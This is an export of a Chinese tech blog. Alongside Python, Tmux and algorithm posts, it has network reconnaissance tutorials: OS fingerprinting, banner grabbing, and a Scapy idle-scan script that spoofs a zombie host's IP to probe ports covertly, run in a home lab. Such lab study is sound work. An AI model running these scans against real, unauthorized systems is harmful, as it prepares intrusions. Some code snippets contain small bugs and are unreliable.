与threading.Condition相类似，相当于没有潜在的Lock保护的condition variable。对象有True和False两个状态。可以多个线程使用wait()等待，直到某个线程调用该对象的set()方法，将对象设置为True。线程可以调用对象的clear()方法来重置对象为False状态。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(7)-信号(singal包)]]></title>
      <url>%2F2016%2F06%2F04%2FPython%E6%A0%87%E5%87%86%E5%BA%93(7)-%E4%BF%A1%E5%8F%B7(singal%E5%8C%85)%2F</url>
      <content type="text"><![CDATA[0x00singal包负责在Python程序内部处理信号，比如预设信号处理函数，暂停并等待信号，以及定时发出SIGALRM等。但要注意的是，signal包主要是针对的UNIX平台，定义windows的支持并不完备。 Python中所用的信号名和Linux一致，比如导入signal123456789import signalprint signal.SIGALRMprint signal.SIGCONTprint signal.SIGKILL运行结果:14189 0x01 预设信号处理函数signal包的核心是使用signal.signal()函数来预设(register)信号处理函数:1signal.signal(signalnum, handler) signalnum为某个信号，handler为该信号的处理函数。首先执行以下test.py脚本12345678#!/usr/bin/pythonimport signaldef myhandler(signum, frame): print(&apos;i received:&apos;, signum) signal.signal(signal.SIGTSTP, myhandler)signal.pause()print(&quot;end of signal demo&quot;) 在主程序中，我们首先使用signal.signal()函数来预设信号处理函数。然后执行signal.pause()来让该进程暂停以等待信号。当有信号传递给该进程时，进程从暂停中恢复，并根据预设，执行SIGTSTP信号处理函数myhandler(). myhandler()的两个参数一个用来识别信号(signum),另一个用来获得信号发生时，进程栈的状况(stack frame),这两个参数都由signal.signal()来传递。 0x02 定时发送SIGALRM信号函数signal.alarm()用于在一定时间后，向进程自身发送SIGALRMX信号:1234567891011121314151617181920#!/usr/bin/pythonimport signaldef myhandler(signum, frame): print(&quot;now,it&apos;s the time&quot;) exit()signal.signal(signal.SIGALRM, myhandler)signal.alarm(5)while True: print(&quot;nor yet&quot;)运行结果:......nor yetnor yetnor yetnor yetnow,it&apos;s the time 在signal.alarm()执行5秒之后，进程将向自己发送SIGALRM信号，然后，信号处理函数myhandler开始执行。 0x03 发送信号signal包的核心是设置信号处理函数，但是除了signal.alarm()能向自身发送信号之外，并没有其它的发送信号的功能。但在os包中，有类似与Linux kill命令的函数: os.kill(pid, sid) os.killpg(pgid, sid) 可以分别向进程和进程组发送信号，sid为信号所对应的整数或者signal.SIG*。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[操作系统识别]]></title>
      <url>%2F2016%2F06%2F04%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB%2F</url>
      <content type="text"><![CDATA[OS的识别技术多种多样，有简单的也有复杂的，最简单的就是用TTL值去识别。不同类型的OS默认的起始TTL值是不同的，比如，windows的默认是128，然后每经过一个路由，TTL值减一。Linux/Unix的值是64，但有些特殊的Unix会是255。 0x00 Python识别TTL值123456789101112131415161718192021#!/usr/bin/python from scapy.all import *import logginglogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)import sysif len(sys.argv) != 2: print(&quot;Usage --/ttl_os.py [IP Address]&quot;) print(&quot;Example --/ttl_os.py 192.168.0.1&quot;) print(&quot;Example will preform ttl analysis to attempt to determine whether the system is windows or linux/unix&quot;) sys.exit() ip = sys.argv[1]ans = sr1(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0)if ans == None: print(&quot;NO response was returned&quot;)elif int(ans[IP].ttl)&lt;=64: print(&quot;Host is Linux/Unix&quot;)else: print(&quot;Host is Windows&quot;) 0x01 NMAP识别OS由于自身脚本的局限性，Python扫描的结果过于简单。NMAP的-O参数同样可以进行OS的识别1234567891011121314151617➜ Python nmap -O 192.168.0.1 Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-04 16:06 CSTNmap scan report for 192.168.0.1Host is up (0.00077s latency).Not shown: 999 closed portsPORT STATE SERVICE80/tcp open httpMAC Address: C8:3A:35:4E:4B:B0 (Tenda Technology)Device type: general purposeRunning: Wind River VxWorksOS CPE: cpe:/o:windriver:vxworksOS details: VxWorksNetwork Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds 使用namp -O 对所在的网关进行OS识别扫描。 0x02 被动识别OS基于网络监听的工作原理，Windows和Linux发送出来的包是有很大区别的。被动式的扫描可以部署在网络进出口的地方，目的是让所经过的流量通过我的流量分析器。 同样在Kali中也存在这般的工具p0f，他会监听凡是通过本地网卡的流量。 123456789101112131415161718➜ ~ p0f--- p0f 3.07b by Michal Zalewski &lt;lcamtuf@coredump.cx&gt; ---[+] Closed 1 file descriptor.[+] Loaded 320 signatures from &apos;p0f.fp&apos;.[+] Intercepting traffic on default interface &apos;eth0&apos;.[+] Default packet filtering configured [+VLAN].[+] Entered main event loop..-[ 192.168.0.109/52188 -&gt; 106.2.189.18/80 (syn) ]-|| client = 192.168.0.109/52188| os = Linux 3.11 and newer| dist = 0| params = none| raw_sig = 4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0|`---- p0f不但会探测OS类型，同时也会对目标上面所运行的应用程序进行探测。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第一Android应用]]></title>
      <url>%2F2016%2F06%2F03%2F%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[0x00 安装Androi开发环境在kali上安装Android Studio由于kali已经默认安装了javac，便不再需要额外配置java环境了。下一步是安装ADT，ADT中包含了Eclipse编辑器和Android SDK。Eclipse能很好的支持Java开发。 安装studio以前还需要1apt-get install lib32z1 lib32ncurses5 lib32stdc++6 linux版的Andro Studio下载链接:https://dl.google.com/dl/android/studio/ide-zips/2.1.1.0/android-studio-ide-143.2821654-linux.zip使用迅雷下载边不需要翻墙了，顺便附上windows的下载链接:win 64位 Android Studio:https://dl.google.com/dl/android/studio/install/2.1.1.0/android-studio-bundle-143.2821654-windows.exe 0x01第一个Androi程序 启动ADT，设置Work Space路径，即是Eclipse的工作路径。 进入Eclipse，点击New Android Application来创建新的App 填写App的名字，并安装Java包的命名规则，将给Package Name命名。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(8)邻接链表的非链接化实现]]></title>
      <url>%2F2016%2F06%2F03%2F(8)%E9%82%BB%E6%8E%A5%E9%93%BE%E8%A1%A8%E7%9A%84%E9%9D%9E%E9%93%BE%E8%A1%A8%E5%8C%96%E5%AE%9E%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[0x00 前言Dijkstra使用了图的邻接矩阵存储法，它的时间和空间复杂度都是N^2，现在来看看另外一种图的存储方法:邻接表。邻接表可以使得时空复杂度都是M，对于稀疏图来讲，M要远远小于N^2。 测试数据如下:1234564 51 4 94 3 81 2 52 4 61 3 7 当然邻接表的实现可以使用两种方法:1)是使用链表来实现；2)是使用非链表的实现方法。 这里使用第二种: 首先使用u，v，w三个数组来记录每条边的具体信息，即u[i],v[i],w[i]表示第i条边是从第u[i]号顶点到v[i]号顶点，且权值为w[i]。 再使用一个pre数组来“存储每个顶点其中一条边的编号”(其实pre数组最后存放的是每个顶点的第一条边(相对于最后的遍历读取时),也是最后读入的那条边(相对于输入数据时))。 最后使用一个next数组来“存储编号为i边”\的“前一条边”。 0x01 创建邻接表创建邻接表的代码如下: 123456789101112131415int n,m,i;//u，v，w数组大小需根据实际情况设置，要比m最大值大1int u[6],v[6],w[6]//pre和next数组大小要根据实际情况设置，要比n最大值大1int pre[5],next[5]scanf(&quot;%d %d&quot;,&amp;n,&amp;m);//初始化pre数组，表示1-n号顶点都没有边的for(i=1;i&lt;=n;i++) pre[i]=-1;for(i=1;i&lt;=m;i++)&#123; scanf(&quot;%d %d %d&quot;,&amp;u[i],&amp;v[i],&amp;w[i]);//读入每一条边 //数据插入的核心算法 next[i]=pre[u[i]]; pre[u[i]]=i;&#125; 遍历每个顶点的所有边 12345678910int k;for(i=1;i&lt;=n;i++)&#123; k=pre[i]; while(k!=-1) &#123; printf(&quot;%d %d %d&quot;,u[k],v[k],w[k]); k=next[k]; &#125;&#125; 邻接表来存储图的时空复杂度是O(M)，遍历每一个边的时间复杂度也是O(M)。当一个图是稀疏图时，M要远小于N^2。因此，稀疏图选用邻接链表来存储要比邻接矩阵好很多。 本文来源:http://blog.jobbole.com/101136/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[服务端扫描]]></title>
      <url>%2F2016%2F05%2F29%2F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%89%AB%E6%8F%8F%2F</url>
      <content type="text"><![CDATA[0x00 碎语我们已经知道，仅仅通过之前的方式扫描出来的端口来看，是不能绝对的认定哪个端口对应的就是某个服务软件或者协议的端口，这不是绝对的。 现在我们将透过表象去真正的探测那些活着的端口背后不为人知的真相，跑的何种应用，包括识别目标的OS版本，捕获Banner信息，以及防火墙识别，SNMP分析作为作为后续攻击的基础。 Banner信息通过banner信息可以获得包括软件开发商，软件名称，服务类型，版本号等信息，有可能通过已知的漏洞和弱点直接渗透到目标主机，当然所有的信息都可能不是真实的_，所有我们有必要结合一些另类的服务识别方法，比如，特征识别和响应字段，而不同的响应可用于识别底层的操作系统。除此外，若想获得对方的banner 信息，就必须通过直接连接的方法。 (简单网络管理协议)SNMP大概是所有网络管理员配置起来最容易出错的一项服务了。 识别防火墙并绕过 0x01 Python Socket获取Banner信息最简单的就是通过nv来简单查看一下。Scapy最主要的作用是向网络里注入数据包，但是它缺乏对应用层的支持，比如很难去发送一个http包，ssh包，它主要针对于三四层网络中包的注入，劫持，嗅探。 此时便需要通过Scoket与目标进行tcp连接，以进行更多的应用层的信息传输。 进入Python，导入Scoket模块:构建一个最简单的Socket连接12345678910&gt;&gt;&gt; import socket&gt;&gt;&gt; banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#这是一个建立socket的标准指令方式#创建一个socket对象，并构建一个banner实例，用以建立一个tcp连接，SOCK_STREAM代表tcp连接&gt;&gt;&gt;banner.connect((&quot;192.168.0.101&quot;, 21))#连接目标端口&gt;&gt;&gt;banner.recv(4096)#指定接收数据的大小&gt;&gt;&gt;banner.close()#关闭连接 0x01 Python脚本实现Banner信息获取123456789101112131415161718192021222324252627#!/usr/bin/python#-*-coding:utf-8-*-import socketimport selectimport sysif len(sys.argv)!=4: print&quot;Usage __ /banner_get.py [Target -IP]j [Fisrst Port] [Last Port]&quot; print&quot;Example __ /banner_get.py 1.0.1.0 1 100&quot; print&quot;Example will get banner for TCP ports 1 through 100 on 10.0.0.5&quot; sys.exit()ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start, end): try: banget = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #表示建立tcp连接 banget.connect((ip.port)) ready = select.select([banget],[],[],1)#若超时时间为1 if ready[0]:#如果ready=0表示没有被挂起的 print&quot;TCP Port&quot;+str(port)+&quot;.&quot;+banget.recv(4096) banget.close() #记得关闭连接，否则对双方来将都是一种伤害 except: pass 0x02 NMAP获得Banner信息NMAP获得banner信息主要是使用了一个banner脚本123456789➜ ~ nmap -sT 192.168.0.113 -p 100-500 --script=banner.nseStarting Nmap 7.01 ( https://nmap.org ) at 2016-06-01 11:18 CSTNmap scan report for 192.168.0.113Host is up (0.00080s latency).Not shown: 398 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn NMAP脚本的存放目录1➜ scripts cd /usr/share/nmap/scripts 0x03 AMAPKali里面除了一个NMAP以外还有一个AMAP，当然AMAP的主要作用便是用来识别端口后所运行的服务为何的。 参数: amap -B ip port 其中nmap的-B参数便是用来发现banner信息的。 0x04 NMAP特征识别123456789101112131415➜ ~ nmap 192.168.0.113 -p100-500 -sVStarting Nmap 7.01 ( https://nmap.org ) at 2016-06-01 11:34 CSTNmap scan report for 192.168.0.113Host is up (0.00075s latency).Not shown: 398 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows 98 netbios-ssn445/tcp open microsoft-ds Microsoft Windows 10 microsoft-dsMAC Address: 5C:F9:DD:6A:02:61 (Dell)Service Info: OSs: Windows, Windows 98, Windows 10; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_10Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds NMAP -sV参数不再只是简单的探测扫描目标端口，而是会发送一系列复杂的探测包，根据响应特征获得signature，获得的信息可信度大幅提高。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(7)Dijkstra最短路径算法]]></title>
      <url>%2F2016%2F05%2F28%2F(7)Dijkstra%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%AE%97%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 算法思维我们已经知道，Floyd最短路径算法，可以很方便求得任意两点间的最短路径，这称为”多源路径算法”。而Dijksta是要求的是指定一点到所有点的最短路径，这称为”单源最短路径”。 我们依旧用二维数组来存储顶点与边之间的关系（其实这是一种图的邻接矩阵存储法）。 1 2 3 4 5 6 1 0 1 12 &amp; &amp; &amp; 2 &amp; 0 9 3 &amp; &amp; 3 &amp; &amp; 0 &amp; 5 &amp; 4 &amp; &amp; 4 0 13 15 5 &amp; &amp; &amp; &amp; 0 4 6 &amp; &amp; &amp; &amp; &amp; 0 有上边可知顶点1到2的距离为1，顶点2到顶点1的没有路。 我们在用一个一维数组dis来存放1号顶点到其余点的初始路程: 1 2 3 4 5 6 dis 0 1 12 &amp; &amp; &amp; 此时dis数组中的值称为最短路的”估计值”. 算法的基本思想是:每次找到里源点最近的那个顶点，然后以该顶点为中心进行松弛操作，最终得到源点到其余所有点的最短路径。 将所有顶点分为两部分，已知最短路径的顶点P和未知最短路径的顶点Q，并用book数组记录他们。book[i]为1代表这个顶点在集合P中。 设源点到自己的距离为0，即dis=0，并将所有不能直接到达的顶点的距离设为无穷。 在集合Q中选择离源点最近的顶点u(即dis(u)最小)加入到集合P中。并以u为起点对其所有能到达的每一条边进行松弛操作。(dis[v]&gt;dis[u]+e[u][v] update;) 重复第三步，知道集合Q为空。最终dis数组的值就是源点到所有顶点的最短路径。 0x01 Dijkstra算法代码实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;stdio.h&gt;int main()&#123; int e[10][10],i,j,n,m,t1,t2,t3,u,v,min; int book[10]; int inf=9999999; int dis[10]; //输入顶点，边 printf(&quot;请输入顶点和边数\n&quot;); scanf(&quot;%d %d&quot;,&amp;n,&amp;m); //初始化 for(i=1;i&lt;=n;i++) &#123; for(j=1;j&lt;=n;j++) &#123; if(i==j) e[i][j]==0; else e[i][j]=inf; &#125; &#125; //输入顶点之间的距离 for(i=1;i&lt;=m;i++) &#123; printf(&quot;请输入两个顶底之间的距离\n&quot;); scanf(&quot;%d %d %d&quot;,&amp;t1,&amp;t2,&amp;t3); e[t1][t2]=t3; &#125; for(i=1;i&lt;=n;i++) &#123; book[i]=0; &#125; book[1]=1; for(i=2;i&lt;=n;i++) dis[i]=e[1][i]; //Dijkstr核心算法 for(i=1;i&lt;=n-1;i++) &#123; min=inf; for(j=1;j&lt;=n;j++) &#123; if(dis[j]&lt;min &amp;&amp; book[j]==0) &#123; min=dis[j]; u=j; &#125; &#125; book[u]=1;//将该顶点加入到Q集合中 for(v=1;v&lt;=n;v++)//对该顶点进行松弛操作 &#123; if(e[u][v]&lt;inf &amp;&amp; dis[v]&gt;dis[u]+e[u][v]) dis[v]=dis[u]+e[u][v]; &#125; &#125; //输出结果 for(i=1;i&lt;=n;i++) printf(&quot;%d&quot;,dis[i]); return 0;&#125; 从上我们可以看出，这个算法的时间复杂度是O(N^2)找里源点最近的点时的时间复杂度是O(N)，以后可以使用堆对其进行优化，达到(logN)。 本文来源:http://blog.jobbole.com/101065/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(6)-subprocess包]]></title>
      <url>%2F2016%2F05%2F27%2FPython%E6%A0%87%E5%87%86%E5%BA%93(6)-subprocess%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00subprocess包主要是 执行外部命令和程序 某种意义上，subprocess的功能与shell类似。此外subprocess还提供了管理标准流(standard stream)和管道(pipe)的工具，以便进行进程间的通信。 subprocess.call()函数可以利用subprocess.call函数来呼叫shell执行我们想执行的命令: 1import subprocesssubprocess.call([&quot;ls&quot;, &quot;-l&quot;])subprocess.call(&quot;ls -l&quot;, shell=True) 我们也可以将程序名和参数一起放在一个表中传递给subproc.call() 12import subprocessrc = subprocess.call([&apos;&apos;ls&quot;, &quot;-l&quot;]) 两种方式结果一样的，只是第一种方法会更安全。 subprocess.call()函数的父进程会等待子进程的完成，返回的退出信息(returncode)。于此 函数相似的函数还有 subprocess.check_call() 子进程完成以后返回0，并检查退出信息，若是returncode不为0则举出错误，可以使用 try...except... 来检查错误;同样 subprocess.check_output() 也会等待子进程完成并返回子进程向标准输出输出的结果。检查退出信息。 Popen()实际上以上三个函数都是基于 Popen() 的封装(wrapper)，封装的目的在于我们能更加容易的使用子进程。但是若想更加个性化的使用子进程时，就要使用Popen类来创建对象一代表子进程。 与上面的封装不同，Popen对象创建以后，主程序不会自动等待子进程完成，需调用对象的wait()方法后，父进程才会等待(即是阻塞 block)。 123import subprocesschild = subprocess.Popen([&quot;ping&quot;, &quot;-c&quot;, &quot;5&quot;, &quot;www.baidu.com&quot;])child.wait() #若是不调用wait()方法子，将不回看到子进程的运行print(&quot;parent process&quot;) 此外，也可以在父进程中对子进程进行其它操作，比如: child.poll():检查子进程的状态 child.kill():终止子进程 child.send_signal():向子进程发送信号 child.terminate():终止子进程 child.pid():子进程的pid 0x01 子进程的文本流控制对于子进程的标准输入，标准输出和标准错误可以使用如下属性表示: child.stdin child.stdout child.stdeer 可以子啊Popen()建立子进程的时候改变标准输入，标准输出和标准错误，并利用 subprocess.PIPE 将多个的子进程的输入和输出连接在一起构成管道(pipe): 1234import subprocesschild = subprocess.Popen([&quot;ls&quot;, &quot;-l&quot;], stdout=subprocess.PIPE)child1 = subprocess.Popen([&quot;wc&quot;], stdin=child.stdout, stdout=subprocess.PIPE)out = child1.communicate()print(out) subprocess.PIPE实际上为文本提供一个缓冲区。child的stdout将文本输出到缓冲区，随后child1的stdin从该PIPE中将文本读取。child1的输出文本也被存放在PIPE中，直到communicate()方法从PIPE中读取出PIPE中的文本。 communicate()是Popen对象的一个方法，该方法会阻塞父进程，直到子进程完成。 123import subprocesschild = subprocess.Popen([&quot;cat&quot;], stdin=subprocess.PIPE)child.communicate(&quot;chen&quot;) 启动子进程后，cat会等待输入，直到我们用communicate()输入”chen”. 本文来自]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[我的zshrc配置]]></title>
      <url>%2F2016%2F05%2F27%2F%E6%88%91%E7%9A%84zshrc%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[0x00 别名配置12alias ffx=&apos;firefox &gt; /tmp/firefox.txt 3&gt;&amp;1 &amp;&apos;alias fuck-gwf=&apos;bash /software/shadowsocks-gui-0.6.4-linux-x64/start.sh &gt; /tmp/gwf.txt 2&gt;&amp;1 &amp;&apos;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tmux]]></title>
      <url>%2F2016%2F05%2F27%2FTmux%2F</url>
      <content type="text"><![CDATA[0x00 什么是Tmux?Tmux是一个工具，用于在一个终端窗口中运行多个终端会话，不仅如此，我们还可以通过Tmux是终端会话运行于后台或者是按需接入，断开会话。 Tmux使用C/S模型构建，主要包括以下单元模块： server服务器。输入tmux命令时就开启了一个服务器。 session会话:一个服务器可以包含多个会话 window窗口:一个会话可以包含多个窗口。 pane面板:一个窗口可以包含多个面板。 0x01 Tmux安装kali中已经默认安装了Tmux，ubuntu下安装指令:apt-get install tmux安装完成以后直接在shell中输入:tmux便会启动了。 0x02 Tmux的快捷键前缀(Prefix)为了使自身的快捷键和其他软件的快捷键互不干扰，Tmux 提供了一个快捷键前缀。当想要使用快捷键时，需要先按下快捷键前缀，然后再按下快捷键。Tmux 所使用的快捷键前缀默认是组合键 Ctrl-b. 0x03 Tmux的配置文件每当开启一新的会话时，Tmux都会读取Tmux的配置文件~/.tmux.conf，我们将下面一行加入到配置文件中，这样每次配置完成以后，只需要按下Ctrl-b r就可以重新加载配置并且使新的配置生效，而不用再开启一个新的会话。 0x04 Tmux的特性 新建窗格 建立一个新的竖直放置的窗格(paner): 1root@jack:~# Ctrl-b % 建立一个水平方向放置的窗格 1root@jack:~# Ctrl-b &quot; 窗格间移动光标，只需按下Tmux的快捷前缀，然后在按下对应的方向键就是了 窗口在Tmux中，窗口(Windows)是个窗格(paner)容器，你可以将多个窗格放置在窗口中，并根据你的实际需要在窗口中排列多个窗格，也是完全取决于你的需要。 新建一个窗口:1root@jack:~# Ctrl-b c 若是想要切换窗口只需要按下Ctrl-b然后再按下窗口对应的数字就可以切换了! 会话一个 Tmux 会话中可以包含多个窗口。会话功能非常简单易用，例如可以为一个特定的项目创建一个专用的 Tmux 会话。若要创建一个新的会话，只需要在终端运行如下的命令：1tmux new &lt;name-of-my-session&gt; 在 Tmux 的会话间切换,若要获取现有会话的列表，可以按下Ctrl-b s,列表中的每个会话都有一个 ID，该 ID 是从 0 开始的。按下对应的 ID 就可以进入会话。如果你已经创建了一个或多个会话，但是还没有运行 Tmux，那么可以输入如下命令以接入已开启的会话。tmux attach 0x05 Tmux快捷键 快捷键前缀 Ctrl+b 激活控制台 系统操作 ？ 列出所有快捷键;按q返回 系统操作 d 脱离当前会话;这样可以暂时返回shell，输入tmux attach能够重新进入之前的会话 系统操作 D 选择要脱离的会话，在同时开启了多个会话时使用 系统操作 Ctrl+z 挂起当前会话 系统操作 s 选择并且切换会话，在同时开启了多个会话时使用 系统操作 : 进入命令行模式，此时可以输入支持的命令，比如kill-server 系统操作 [ 进入复制模式，此时操作与vi相同，q/Esc退出 系统操作 ～ 列出提示信息缓存，其中包含了之前tmux返回的各种提示信息 — — — 窗口操作 c 创建一个新窗口 窗口操作 &amp; 关闭当前窗口 窗口操作 数字 切换到指定窗口 窗口操作 p 切换到上一个窗口 窗口操作 n 切换到下一个窗口 窗口操作 l 在前后两个窗口间相互切换 窗口操作 w 通过窗口列表切换窗口 窗口操作 ‘ 重命名当前窗口，便于识别 窗口操作 . 修改当前窗口编号，相当于重新排序 窗口操作 f 在所有窗口中查找指定文本 — — — 面板操作 “ 将当前面板分为上下两块 面板操作 % 将当前面板分为左右两块 面板操作 x 关闭当前面板 面板操作 ！ 将当前面板置于新窗口，即新建一个窗口，其中仅包含当前面板 面板操作 Ctrl+方向建 以一个单元格为单位移动边缘以调整当前面板的大小 面板操作 Alt+方向键 以五个单元格为单位移动边缘以调整当前面板大小 面板操作 q 显示面板标号 面板操作 o 在当前面板中选择下面板 面板操作 方向键 移动光标以选择面板 面板操作 { 向前置换当前面板 面板操作 } 向后置换当前面板 本文参考来自:http://blog.jobbole.com/87584/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[僵尸扫描]]></title>
      <url>%2F2016%2F05%2F27%2F%E5%83%B5%E5%B0%B8%E6%89%AB%E6%8F%8F%2F</url>
      <content type="text"><![CDATA[0x00 碎语僵尸扫描的极度隐蔽绝决定了它的实施条件的苛刻，鱼与熊掌不可兼得，本就是宇宙法则。一个合格的僵尸机是实现僵尸扫描的关键因素，僵尸至少要保证在进行扫描阶段不会产生其它的IP包，即是不会与我们主机之外的任何机器进行第三层的IP通讯，至少在我们控制其进行扫描的阶段不可以，否则将直接导致我们扫描结果不可靠，白费时间。 何为合适的僵尸机:1)足够闲置;2）它的IPID必须是递增的，0和随机都不可以。然而现在大部分主流的OS的IPID都是随机产生的，但是早期的xp，比如xp200，xp2003都是递增的IPID。 0x01 僵尸扫描的过程 最开始扫描者主机对Zombie(僵尸机)发送SYN/ACK包，然后Zombie（假设此时系统产生的IPID为x）会回个主机一个RST，主机将会得到Zombie的IPID； 然后扫描主机向目标机器发送一个SYN包，有所不同的是，此时扫描主机会伪造一个伪装成Zombie的IP(即是x)向目标主机发送SYN包。 如果目标的端口开放，便会向Zombie返回一个SYN/ACK包，但是人家Zombie并没有发送任何的包啊，zombie会觉得莫名其妙，于是向目标主机发送一RST过去询问，此时Zombie的IPID将会增加1(x+1)。若果目标主机的端口并未开放，那么目标主机也会想Zombie发送一个RST包，但是Zombie收到RST包不会有任何反应，所以IPID不会改变(依旧是x)。 最后扫描者主机再向Zombie发送一个SYN/ACK，同样的Zombie会摸不着头脑，然后在懵懂中向扫描者主机发送一个RST包，此时Zombie的IPID将变成(x+2)。最后我们在zombies的迷惘中我们已经知道了我们想知道的。 0x02 渗透环境扫描主机 kali: { ip:192.168.86.129 } zombie xp: { ip:192.168.86.132 } 目标主机 metasploitable: { ip:192.168.86.130 } 0x03 Scapy实现方法 构造Scapy扫描包 分步构成构造request zombie包:12345678&gt;&gt;&gt; i=IP() #构造ip包头&gt;&gt;&gt; t=TCP() #构造tcp包头&gt;&gt;&gt; rz=(i/t) #request_zombie，构造发送给僵尸机的数据包，将发送给xp&gt;&gt;&gt; rt=(i/t) #request_target,构造发送给目标主机的数据包，将发送给meta&gt;&gt;&gt;rz[IP].dst=&quot;192.168.86.132&quot;//定义zombie的ip地址&gt;&gt;&gt;rz[TCP].dport=445 //定义发送到zombie的端口，务必确保这个端口是开启的端口，445端口是win中默认开启的&gt;&gt;&gt;rz[TCP].flags=&quot;SA&quot;//定义向zombie发送的数据包是SYN/ACK包&gt;&gt;&gt; 构造request target包:1234&gt;&gt;&gt;rt[IP].src=&quot;192.168.86.132&quot;//定义rt包的源ip地址，直接伪造为xp的ip&gt;&gt;&gt;rt[IP].dst=&quot;192.168.86.130&quot;//定义rt包的目的ip，就是目标ip了，meta&gt;&gt;&gt;rt[TCP].dport=25//定义rt包扫描的端口&gt;&gt;&gt;rt[TCP].flags=&quot;S&quot;//定义发送的rt包为SYN包 然后将会发送两次rz包，一次rt包，最后在对结果进行分析。1234567891011121314151617&gt;&gt;&gt;az1=sr1(rz) #向zombie发的第一个包az1Begin emission:Finished to send 1 packets.*Received 1 packets, got 1 answers, remaining 0 packets&gt;&gt;&gt;at=sr1(rt，timeout=1) #向目标机发包，由于我们不会收到回包，因为给zombie了，所以需要设置超时时间Begin emission:Finished to send 1 packets.*Received 1 packets, got 1 answers, remaining 0 packets&gt;&gt;&gt;az2=sr1(rz) #向zombie发送的第二个包az2Begin emission:Finished to send 1 packets.*Received 1 packets, got 1 answers, remaining 0 packets 分析az1与az2IPID:1234&gt;&gt;&gt; az1&lt;IP version=4L ihl=5L tos=0x0 len=40 id=436 flags= frag=0L ttl=128 src=192.168.86.132 dst=192.168.86.129 options=[] &gt;&gt;&gt; az2&lt;IP version=4L ihl=5L tos=0x0 len=40 id=438 f proto=tcp chksum=0xac5 src=192.168.86.132 dst=192.168.86.129 通过分析发现目标的25是开放的。 Python脚本实现僵尸扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/python#-*-coding:utf-8-*-import logginglogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *def ipid(zombie):#定义一个ipid函数，同时定义一个zombie变量。该函数的作用是探测一主机是否可以作为僵尸机 reply1 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;), timeout=2,verbose=0)#向zombie发送一个syn/ack包 send(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),verbose=0)#send()与sr1()方法的区别是:sr1发送出去一个包以后会在接收对方的一个回包，而send方法不会接收包 reply2 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0)#紧接着在向僵尸机发送一个syn/ack包 if reply2[IP].id == (reply1[IP].id+2):#根据发送的三个来判断僵尸机是否足够空闲,并且ipid序号是否为递增的。 print(&quot;IPID secquence is incremental and target appears to be idle,ZOMBIE LOCATED&quot;) response = raw_input(&quot;Do you want to use this zombie to perform a scan?(Y or N):&quot;) if response == &quot;Y&quot;: #是否使用该僵尸机执行扫描 target = raw_input(&quot;Enter the IP address of the target system:&quot;) #输入要扫描的目标主机ip zombiescan(target, zombie) else: print(&quot;Either the IPID secquence is not incremental or the target if not idle. NOT A Good zombie&quot;)def zombiescan(target, zombie): print(&quot;\nScanning target&quot;+target+&quot;with zombie&quot;+zombie) print&quot;\n-------Open Ports On Target-----\n&quot; for port in range(1,100):#扫描目标1-100的端口 try: start_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;,dport=port),timeout=2,verbose=0) send(IP(src=zombie,dst=target)/TCP(flags=&quot;S&quot;,dport=port),verbose=0) end_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0) if end_val[IP].id == (start_val[IP].id+2): print(port) except: pass#主函数内容print&quot;------Zombie Scan Suite------\n&quot; #这是僵尸扫描套件程序print&quot;1.----Identity Zombie Host\n&quot; #识别僵尸机print&quot;2.----Preform Zombie Scan\n&quot; #执行扫描过程aws = raw_input(&quot;Select an Option (1 or 2):&quot;)if aws == &quot;1&quot;: zombie = raw_input(&quot;Enter IP address to test IPID sequence:&quot;) ipid(zombie)else: if aws == &quot;2&quot;: zombie = raw_input(&quot;Enter IP address for zombie System:\n&quot;) target = raw_input(&quot;Enter IP address for Scan Target:\n&quot;) zombiescan(target,zombie) 0x04 NMAP实现僵尸扫描同样的，如果使用NMAP进行僵尸扫描，首先找到合适的僵尸机是最关键的。 除此以为，NMAP本身提供了大量用于僵尸扫描的脚本程序(大概400多种)，我们可以在NMAP中调用这些脚本程序来判断一个主机是否是一个合适的僵尸机。同样这些脚本所遵循也是根据对方IPIID是否递增来判断的。 